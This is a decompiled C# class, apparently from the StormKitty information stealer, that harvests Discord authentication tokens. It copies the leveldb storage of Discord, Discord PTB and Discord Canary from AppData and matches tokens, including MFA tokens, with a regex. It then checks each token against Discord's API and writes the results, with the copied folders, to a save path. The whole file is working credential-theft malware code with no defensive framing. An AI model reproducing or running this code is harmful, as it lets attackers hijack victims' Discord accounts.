﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using StormKitty;
using StormKitty.Implant;

namespace Stealer
{
	// Token: 0x0200001F RID: 31
	internal sealed class Discord
	{
		// Token: 0x06000091 RID: 145 RVA: 0x000050DC File Offset: 0x000032DC
		public static void WriteDiscord(string[] lcDicordTokens, string sSavePath)
		{
			if (lcDicordTokens.Length != 0)
			{
				Directory.CreateDirectory(sSavePath);
				Counter.Discord = true;
				try
				{
					foreach (string str in lcDicordTokens)
					{
						File.AppendAllText(sSavePath + "\\tokens.txt", str + "\n");
					}
				}
				catch (Exception value)
				{
					Console.WriteLine(value);
				}
			}
			try
			{
				Discord.CopyLevelDb(sSavePath);
			}
			catch
			{
			}
		}

		// Token: 0x06000092 RID: 146 RVA: 0x0000515C File Offset: 0x0000335C
		private static void CopyLevelDb(string sSavePath)
		{
			foreach (string path in Discord.DiscordDirectories)
			{
				string text = Path.Combine(Paths.appdata, path);
				string destFolder = Path.Combine(sSavePath, new DirectoryInfo(text).Name);
				if (Directory.Exists(text))
				{
					try
					{
						Filemanager.CopyDirectory(text, destFolder);
					}
					catch
					{
					}
				}
			}
		}

		// Token: 0x06000093 RID: 147 RVA: 0x000051C8 File Offset: 0x000033C8
		private static string TokenState(string token)
		{
			try
			{
				using (WebClient webClient = new WebClient())
				{
					webClient.Headers.Add("Authorization", token);
					return webClient.DownloadString("https://discordapp.com/api/v6/users/@me").Contains("Unauthorized") ? "Token is invalid" : "Token is valid";
				}
			}
			catch
			{
			}
			return "Connection error";
		}

		// Token: 0x06000094 RID: 148 RVA: 0x00005254 File Offset: 0x00003454
		public static string[] GetTokens()
		{
			List<string> list = new List<string>();
			try
			{
				foreach (string path in Discord.DiscordDirectories)
				{
					string text = Path.Combine(Paths.appdata, path);
					string text2 = Path.Combine(Path.GetTempPath(), new DirectoryInfo(text).Name);
					if (Directory.Exists(text))
					{
						Filemanager.CopyDirectory(text, text2);
						foreach (string text3 in Directory.GetFiles(text2))
						{
							if (text3.EndsWith(".log") || text3.EndsWith(".ldb"))
							{
								string input = File.ReadAllText(text3);
								Match match = Discord.TokenRegex.Match(input);
								if (match.Success)
								{
									list.Add(match.Value + " - " + Discord.TokenState(match.Value));
								}
							}
						}
						Filemanager.RecursiveDelete(text2);
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return list.ToArray();
		}

		// Token: 0x04000070 RID: 112
		private static Regex TokenRegex = new Regex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_\\-]{27}|mfa\\.[a-zA-Z0-9_\\-]{84}");

		// Token: 0x04000071 RID: 113
		private static string[] DiscordDirectories = new string[]
		{
			"Discord\\Local Storage\\leveldb",
			"Discord PTB\\Local Storage\\leveldb",
			"Discord Canary\\leveldb"
		};
	}
}
